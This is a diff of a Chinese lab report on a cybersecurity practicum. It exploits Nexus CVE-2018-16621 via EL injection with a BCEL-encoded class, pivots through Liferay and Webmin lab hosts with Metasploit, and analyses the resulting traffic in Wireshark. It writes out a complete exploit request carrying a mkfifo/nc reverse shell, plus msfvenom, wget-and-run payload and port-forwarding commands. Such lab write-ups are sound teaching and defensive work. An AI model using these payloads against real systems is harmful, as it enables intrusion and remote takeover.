@@ -1,8 +1,6 @@
-## 网安实践2
+# 网安实践2
 
-### 拓扑搭建
-
----
+## 拓扑搭建
 
 候选靶场镜像经过测试，可用列表如下：
 
@@ -21,7 +19,7 @@
 
 在此基础上选取镜像搭建如下结构的网络：
 
-
+<img src="picture/网络拓扑.png" alt="网络拓扑" style="zoom:33%;" />
 
 其中所用网卡信息如下：
 
@@ -51,13 +49,13 @@
 
 1.浏览器访问靶场环境：
 
-<img src="picture/nexus浏览器访问.png" alt="nexus浏览器访问" style="zoom:33%;" />
+<img src="picture/nexus浏览器访问.png" alt="nexus浏览器访问" style="zoom: 25%;" />
 
 2.该漏洞需要访问更新角色或创建角色接口，在修改用户角色参数roles中进行EL注入或者也可通过创建角色的roles 和 privileges参数进行EL注入，所以我们需要使用默认账号密码admin/admin123登录后台。<img src="picture/nexus登录.png" alt="nexus登录" style="zoom:33%;" />
 
 3.在此选择对修改用户角色参数roles中进行EL注入，我们选择找到设置中的User处：
 
-<img src="picture/nexus更改Lastname.png" alt="nexus更改Lastname" style="zoom:33%;" />
+<img src="picture/nexus更改Lastname.png" alt="nexus更改Lastname" style="zoom: 25%;" />
 
 随便改改LastName，这里从User改为了User1，然后抓包如下，发现注入点：
 
@@ -139,11 +137,11 @@ ${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEng
 
   也失败了。
 
-7.目前el 2.1 表达式可以实现的功能: newInstance() 无参构造一个类实例、调用对象 非可变参数的方法。
+7.目前el 2.1 表达式可以实现的功能: ①newInstance() 无参构造一个类实例  ②调用对象 非可变参数的方法。
 
-尝试调用恶意class `com.sun.org.apache.bcel.internal.util.ClassLoader`加载编码后的恶意class 导致rce。
+尝试调用恶意class `com.sun.org.apache.bcel.internal.util.ClassLoader`加载编码后的恶意class导致rce。
 
-这里用el 表达式表述就是：
+这里用 el 表达式表述就是：
 
 ```java
 ${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$evalClass').newInstance()}
@@ -194,7 +192,7 @@ ${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInsta
   java --add-exports java.xml/com.sun.org.apache.bcel.internal.classfile=ALL-UNNAMED -jar BCELCodeman.jar e .\eval2.class
   ```
 
-  <img src="picture/nexusBCEL编码.png" alt="nexusBCEL编码" style="zoom: 50%;" />
+  <img src="picture/nexusBCEL编码.png" alt="nexusBCEL编码" style="zoom: 33%;" />
 
 - 加载编码后的恶意class，调用exec方法执行 `ls /tmp` 命令获取flag：
 
@@ -244,25 +242,35 @@ Content-Length: 221
 
 #### 内网渗透攻击
 
+> 注：此处的渗透路径由前期工作探索得到
+
 ##### 第一层
+
+0.Wordpress靶场漏洞利用成功之后，获得反弹shell，查看对应ip为`192.170.84.5`：
+
+<img src="picture/wordpress的ip.png" alt="wordpress的ip" style="zoom:33%;" />
 
 1.`kali-attacker`命令行执行`msfconsole`启动msf。
 
 2.搜索`liferay`漏洞利用模块并使用：
 
-<img src="picture/搜索liferay模块并使用.png" alt="搜索liferay模块并使用" style="zoom:50%;" />
+<img src="picture/搜索liferay模块并使用.png" alt="搜索liferay模块并使用" style="zoom: 33%;" />
 
 3.查看模块利用所需参数：
 
-<img src="picture/liferay查看参数.png" alt="liferay查看参数" style="zoom:50%;" />
+<img src="picture/liferay查看参数.png" alt="liferay查看参数" style="zoom: 33%;" />
 
 4.模块设置参数并运行：
 
-<img src="picture/liferay设置参数并运行.png" alt="liferay设置参数并运行" style="zoom:50%;" />
+<img src="picture/liferay设置参数并运行.png" alt="liferay设置参数并运行" style="zoom: 33%;" />
 
-5.进入到靶场shell之后查看网络情况，发现其为双网卡：
+5.进入到靶场shell之后查看网络情况，发现其为双网卡，其在`192.170.84.0/24`网段下的ip为`192.170.84.6`：
 
 <img src="picture/liferay查看网络情况.png" alt="liferay查看网络情况" style="zoom:33%;" />
+
+由此可以完善我们的第一层网络拓扑：
+
+<img src="picture/第一层网络拓扑图.png" alt="第一层网络拓扑图" style="zoom:33%;" />
 
 6.在`meterpreter`中添加自动路由并查看：
 
@@ -273,15 +281,35 @@ run post/multi/manage/autoroute
 run autoroute -p
 ```
 
-<img src="picture/liferay添加自动路由并查看路由表.png" alt="liferay添加自动路由并查看路由表" style="zoom:50%;" />
+<img src="picture/liferay添加自动路由并查看路由表.png" alt="liferay添加自动路由并查看路由表" style="zoom: 33%;" />
 
 7.执行`bg`将session放于后台，之后搜索`portscan`扫描模块并使用`auxiliary/scanner/portscan/tcp`：
 
-<img src="picture/liferay搜索扫描模块并使用.png" alt="liferay搜索扫描模块并使用" style="zoom:50%;" />
+<img src="picture/liferay搜索扫描模块并使用.png" alt="liferay搜索扫描模块并使用" style="zoom: 33%;" />
 
-8.设置扫描模块参数并运行，得到webmin靶场内网ip地址：
+8.设置扫描模块参数并运行：
 
-<img src="picture/liferay扫描设置参数、运行.png" alt="liferay扫描设置参数、运行" style="zoom:50%;" />
+<img src="picture/liferay设置扫描参数运行.png" alt="liferay扫描设置参数、运行" style="zoom: 33%;" />
+
+9.进入已经获得的liferay终端中使用curl进行进一步的网页信息获取：
+
+发现webmin靶场url为`192.170.84.4:10000`：
+
+<img src="picture/发现webmin.png" alt="发现webmin" style="zoom:25%;" />
+
+发现phpimap靶场url为`192.170.84.2:80`，其中网页内容为经典的phpimap漏洞靶场演示页：
+
+<img src="picture/发现phpimap.png" alt="发现phpimap" style="zoom:33%;" />
+
+下载并查看网页html内容，发现druid靶场url为`192:170.84.3:8888`：
+
+<img src="picture/下载druid网页内容.png" alt="下载druid网页内容" style="zoom:33%;" />
+
+<img src="picture/发现druid.png" alt="发现druid" style="zoom:33%;" />
+
+10.由此可得前两层网络拓扑：
+
+<img src="picture/前两层网络拓扑图.png" alt="前两层网络拓扑图" style="zoom:33%;" />
 
 ##### 第二层
 
@@ -289,15 +317,15 @@ run autoroute -p
 
 1.搜索webmin对应漏洞利用模块并使用：
 
-<img src="picture/webmin搜索模块并使用.png" alt="webmin搜索模块并使用" style="zoom:50%;" />
+<img src="picture/webmin搜索名称模块并使用.png" alt="webmin搜索模块并使用" style="zoom: 33%;" />
 
 2.设置模块所需参数并运行模块：
 
-<img src="picture/webmin设置模块参数并运行.png" alt="webmin设置模块参数并运行" style="zoom:50%;" />
+<img src="picture/webmin设置模块参数并运行.png" alt="webmin设置模块参数并运行" style="zoom: 33%;" />
 
 3.得到Command shell之后执行`session -u 2`升级shell。
 
-<img src="picture/webmin升级shell.png" alt="webmin升级shell" style="zoom:50%;" />
+<img src="picture/webmin升级shell.png" alt="webmin升级shell" style="zoom: 33%;" />
 
 4.进入升级后的shell并查看当前靶机网络情况：
 
@@ -307,21 +335,25 @@ run autoroute -p
 
 5.添加自动路由并查看路由表：
 
-<img src="picture/webmin添加自动路由并查看路由表.png" alt="webmin添加自动路由并查看路由表" style="zoom:50%;" />
+<img src="picture/webmin添加自动路由并查看路由表.png" alt="webmin添加自动路由并查看路由表" style="zoom: 33%;" />
 
 6.搜索端口扫描模块并使用，之后设置参数运行：
 
-<img src="picture/webmin搜索端口扫描模块并使用.png" alt="webmin搜索端口扫描模块并使用" style="zoom:50%;" />
+<img src="picture/webmin搜索端口扫描模块并使用.png" alt="webmin搜索端口扫描模块并使用" style="zoom: 33%;" />
 
-<img src="picture/webmin扫描 设置参数并运行.png" alt="webmin扫描 设置参数并运行" style="zoom:50%;" />
+<img src="picture/webmin扫描 设置参数并运行.png" alt="webmin扫描 设置参数并运行" style="zoom: 33%;" />
 
 扫描结果得到两个可访问ip：`10.10.10.3` 和 `10.10.10.5` 。
 
 7.进入Webmin靶场shell升级后的session会话，恢复到shell终端后curl访问两个候选靶场地址：
 
-<img src="picture/webmin进入升级后终端，curl访问网页.png" alt="webmin进入升级后终端，curl访问网页" style="zoom:50%;" />
+<img src="picture/webmin进入升级后终端，curl访问网页.png" alt="webmin进入升级后终端，curl访问网页" style="zoom: 25%;" />
 
 发现`10.10.10.5:8081` 网页符合Nexus目标靶场的特征。
+
+完善已知网络拓扑图：
+
+<img src="picture/前三层拓扑.png" alt="前三层拓扑" style="zoom:33%;" />
 
 8.之后再次进入升级后的Webmin靶场shell，使用`portfwd`映射Nexus靶场8081端口到本地9001端口：
 
@@ -329,7 +361,7 @@ run autoroute -p
 portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
 ```
 
-<img src="picture/进入升级后的webmin，映射nexus端口8081到本地端口9001.png" alt="进入升级后的webmin，映射nexus端口8081到本地端口9001" style="zoom:50%;" />
+<img src="picture/进入升级后的webmin，映射nexus端口8081到本地端口9001.png" alt="进入升级后的webmin，映射nexus端口8081到本地端口9001" style="zoom: 33%;" />
 
 9.之后本地宿主机就可以通过访问{攻击机ip}:{映射端口}，即`192.168.109.10:9001`访问Nexus靶场。
 
@@ -345,7 +377,7 @@ portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.109.10 LPORT=5555 -f elf -o meter.elf
   ```
 
-  <img src="picture/nexus_映射_生成meter.elf文件.png" alt="nexus_映射_生成meter.elf文件" style="zoom:50%;" />
+  <img src="picture/nexus_映射_生成meter.elf文件.png" alt="nexus_映射_生成meter.elf文件" style="zoom: 33%;" />
 
   参数说明：
 
@@ -360,7 +392,7 @@ portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
   python3 -m http.server 8000
   ```
 
-  <img src="picture/nexus_映射_Kali攻击机开启http服务.png" alt="nexus_映射_Kali攻击机开启http服务" style="zoom:50%;" />
+  <img src="picture/nexus_映射_Kali攻击机开启http服务.png" alt="nexus_映射_Kali攻击机开启http服务" style="zoom: 33%;" />
 
 - kali攻击机在终端开启端口监听：
 
@@ -392,19 +424,28 @@ portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
 
 - 在msf中使用监听模块并设置相应的参数运行：
 
-  <img src="picture/nexus_映射_使用监听模块，设置对应payload类型.png" alt="nexus_映射_使用监听模块，设置对应payload类型" style="zoom:50%;" />
+  <img src="picture/nexus_映射_使用监听模块，设置对应payload类型.png" alt="nexus_映射_使用监听模块，设置对应payload类型" style="zoom: 33%;" />
 
 - get反弹shell之后下载payload文件，为其添加可执行权限，之后运行`meter.elf`：
 
-  <img src="picture/nexus_映射_nc监听，下载执行脚本.png" alt="nexus_映射_nc监听，下载执行脚本" style="zoom:50%;" />
+  ```bash
+  # 攻击机中运行
+  nc -lvnp 6666 
+  # 靶场容器中运行
+  wget http://192.168.109.10:8000/meter.elf -O /tmp/meter
+  chmod +x /tmp/meter
+  /tmp/meter
+  ```
+
+  <img src="picture/nexus_映射_nc监听，下载执行脚本.png" alt="nexus_映射_nc监听，下载执行脚本" style="zoom: 33%;" />
 
 - 在msf中可以看到目标靶场反连成功，开启了相应的session：
 
-  <img src="picture/nexus反连成功，开启session.png" alt="nexus反连成功，开启session" style="zoom:50%;" />
+  <img src="picture/nexus反连成功，开启session.png" alt="nexus反连成功，开启session" style="zoom: 33%;" />
 
 - 查看目前已有的sessions列表：
 
-  <img src="picture/查看session列表.png" alt="查看session列表" style="zoom:50%;" />
+  <img src="picture/查看session列表.png" alt="查看session列表" style="zoom: 33%;" />
 
 - 进入Nexus目标靶场反连过来的meterpreter中，查看网络情况：
 
@@ -412,4 +453,142 @@ portfwd add -L 0.0.0.0 -l 9001 -p 8081 -r 10.10.10.5
 
   发现其为双网卡靶机，之后可进行下一层的内网渗透。
 
-  
+#### 漏洞利用流量检测
+
+1.靶机中使用`tcpdump`对容器中`Devnet`网卡进行监听并将监听结果写入pcap包；
+
+攻击机执行`nc -lvnp 6666` 监听端口接收回连shell；
+
+`yakit`发送自制POC进行反弹shell：
+
+```
+POST /service/extdirect HTTP/1.1
+Host: 192.168.109.10:9001
+Cookie: NXSESSIONID=3ca5fe18-1417-4694-88a4-f6fd8f2a6b28
+Content-Type: application/json
+Origin: http://192.168.109.10:9001
+Referer: http://192.168.109.10:9001/
+X-Nexus-UI: true
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Content-Length: 221
+
+{"action":"coreui_User","method":"update","data":[{"userId":"admin","version":"10","firstName":"Administrator","lastName":"User1","email":"admin@example.org","status":"active","roles":["${''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$ff$8dSMS$d3P$U$3d$8f$b6I$J$v$U$K$94$60QA$c5P$uU$E$3fZD$Fq$86$Z$40$87$3a$3a$ZWi$fa$c0$60I$3ai$ca$b0r$e5$7fq$ab$9b$d6$91$d1$a5$L$7f$87$L$fd$P$8ex_Z$3e$8a$ca$d8I$df$cb$bb$f7$9c$7b$eeG$de$d7_$l$3f$D$98$c5$p$F$j$I$c9$I$ab$88$40b$88o$9b$bbf$b6l$3a$5b$d9$c7$c5mn$f9$M$d2$bc$ed$d8$fe$CCH$9fx$a6$m$8aN$Z$8a$8a$$$a8$M$bd$c7$f0$8d$9a$e3$db$3b$9cA$d9$e2$fe$d1a$40$9fX$fd$D$93$97$d1$dd$sU$f0$3d$db$d9$8a$o$ce$mg$8b$b6$93$ad$be$8c$a2$8f$a1$pc$J$c1$7e$V$D$Yd$I$f3$3dn1$e8$fa$8b$d5$d3$dc$fcI$99$t$9ek$f1j$95d$86$Y$G$D$bb$edf$Xk$9b$9b$dc$e3$a5$Nn$96$b8$tc$98A$3b$f4$ad8$95$9aO$91$b8$b9$d3t$xHaD$c6y$V$Xp$b1$ad$ceVp$86n$aa$f3$E$8f$nyXk$7b$c0$bc$C$Nc$a2$bf$97$Y$86$f4$bfBDc$93$b8$o$40$e3$M$89cP3$9b$c0$9f$82$aebBd$p$94$97$3d$cf$f5$9al$Z$93$q$7e$ba$p$8b5$bb$i$U$92FH$E$9fV$91$c55$86$uQJ$ab$b6C$c3$e9o$hN$ab$91$820$a3$e2$Gfi$f4f$a5$c2$9d$SCF$3f$bb$e3m$92A$88$9b$o$c4$z$86$94$bet6$f0$8e$8a$5c$90$97$ef6$9d2$e6$Z$o$7c$d7$y$cf$d0$c8$97$dc$Se$da$p$S$5e$af$ed$U$b9$f7$d4$y$96$c92$fe_$Z$e5$Zb$F$df$b4$5e$ad$99$95$WQY$de$b3x$c5$b7$5d$a7$wc$89$9a$7d$cc9$f2$Q$aa$e0$d6$3c$8b$3f$b2$DJ$90$cc$b4$Ab$Uy$ba1$e2$d7$B$s$ee$M$adw$e94B$3b$a3$3d$92n$80$bd$a7$X$86$FZ$a5$c0$Y$a6u$A$f7$88$o$a0$df$88$s$d3$fe$e6$Dd$e9$TbF$a8$af$a7$60$84$fbz$LFd$b2PGbm$lIc$l$9a1U$c7$b9$GF$h$b8$bc$7e$c2t$b5i$ca$85$f7$916$g$98$caE2ud$8c$9c$f4$F$J$z$a2Iu$5c$8f$xu$cc$3d$7f$7b$f0C$L$ff$cb$f5$5d$8b$d4q$fb$5dP$88$c8t$i$9d$b4F$e9$5b$ed$c2$YTL$n$869t$e3$3e$e2XA$C$W$fa$f1$g$83t$G$f9C$Hd$94d$d0$j$8b$c9H$c9H$GO$g$f8$J$8dl$c3x$d0$aa$7b$91$fe$P$D$95$e5$df$5d$90$g$iv$E$A$A').newInstance().exec('rm -f /tmp/f;mkfifo /tmp/f;/bin/sh -i < /tmp/f 2>&1 | nc 192.168.109.10 6666 > /tmp/f')} "]}],"type":"rpc","tid":24}
+```
+
+<img src="picture/nexus漏洞利用流量抓包.png" alt="nexus漏洞利用流量抓包" style="zoom: 25%;" />
+
+2.使用wireshark分析流量包，筛选http流量：
+
+<img src="picture/nexus筛选http流，查看可疑数据包.png" alt="nexus筛选http流，查看可疑数据包" style="zoom:33%;" />
+
+3.按数据包长度排序，发现可疑流量，对其进行http流追踪：
+
+<img src="picture/nexus对可疑流量包进行http追踪流量.png" alt="nexus对可疑流量包进行http追踪流量" style="zoom:25%;" />
+
+4.发现其中包含恶意负载，执行反弹shell命令。
+
+<img src="picture/nexushttp追踪流发现反弹shell的命令执行.png" alt="nexushttp追踪流发现反弹shell的命令执行" style="zoom: 25%;" />
+
+## 遇到的问题及解决方案
+
+1.在进行加载编码后的恶意class部分时，使用编码后的class，执行命令时发现当执行一整条命令时不能执行连接符、管道符等 Shell 语法，如执行`echo 1 && echo 2` 结果为 `1 && echo2`。
+
+原因：
+
+原始`eval.java`:
+
+```java
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class eval {
+    public String exec(String cmd) throws Exception {
+        BufferedReader br = new BufferedReader(
+                new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
+        StringBuilder sb = new StringBuilder();
+        for (String line; (line = br.readLine()) != null; )
+            sb.append(line).append('\n');
+        return sb.toString();
+    }
+}
+```
+
+其中`Runtime.getRuntime().exec(cmd)`核心的命令执行方式，Java 在后台会自动将这个字符串**按空格拆分**，类似执行：
+
+```bash
+exec("echo", "1", "&&", "echo", "2")
+```
+
+这不是通过 Shell，而是直接执行了程序 `echo`，后面的 `"1"`, `"&&"`, `"echo"`, `"2"` 都当作参数：
+
+```bash
+执行的是：echo 1 && echo 2
+         ↑     ↑   ↑     ↑
+       程序   参数 参数  参数
+
+```
+
+此时的 `|`、`;`、`>` 等只是**普通文本参数**，根本不会有管道功能。
+
+解决方案：将原始`eval` 类中心的命令执行方式从：
+
+```java
+Runtime.getRuntime().exec(cmd)
+```
+
+改为：
+
+```java
+Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd})
+```
+
+修改后的`eval.java`:
+
+```java
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class eval2 {
+
+    public String exec(String cmd) throws Exception {
+
+        Process p = Runtime.getRuntime().exec(             // ***
+                new String[]{"/bin/sh", "-c", cmd});       // ***
+
+        BufferedReader br = new BufferedReader(
+                new InputStreamReader(p.getInputStream()));
+        BufferedReader err = new BufferedReader(
+                new InputStreamReader(p.getErrorStream()));
+
+        StringBuilder sb = new StringBuilder();
+        String line;
+
+        while ((line = br.readLine()) != null)  sb.append(line).append('\n');
+        while ((line = err.readLine()) != null) sb.append(line).append('\n');
+
+        return sb.toString();
+    }
+}
+```
+
+之后使用javac将其编译，之后再BCEL编码使用即可。
+
+验证问题解决：
+
+<img src="picture/nexus测试连接符可用.png" alt="nexus测试连接符可用" style="zoom:25%;" />
+
+## 参考资料
+
+[Java中动态加载字节码的方法 (持续补充)_utility.encode true false-CSDN博客](https://blog.csdn.net/mole_exp/article/details/122768814)
+
+[f1tz/BCELCodeman: BCEL encode/decode manager for fastjson payloads](https://github.com/f1tz/BCELCodeman)
+
+[msf如何连接数据库 | PingCode智库](https://docs.pingcode.com/baike/2170202)
+
+[后渗透之MSF添加路由与主机探测_msf上线后路由开启无法扫描存活-CSDN博客](https://blog.csdn.net/qq_44159028/article/details/115802527)
+
+[CVE Record: CVE-2018-16621](https://www.cve.org/CVERecord?id=CVE-2018-16621)
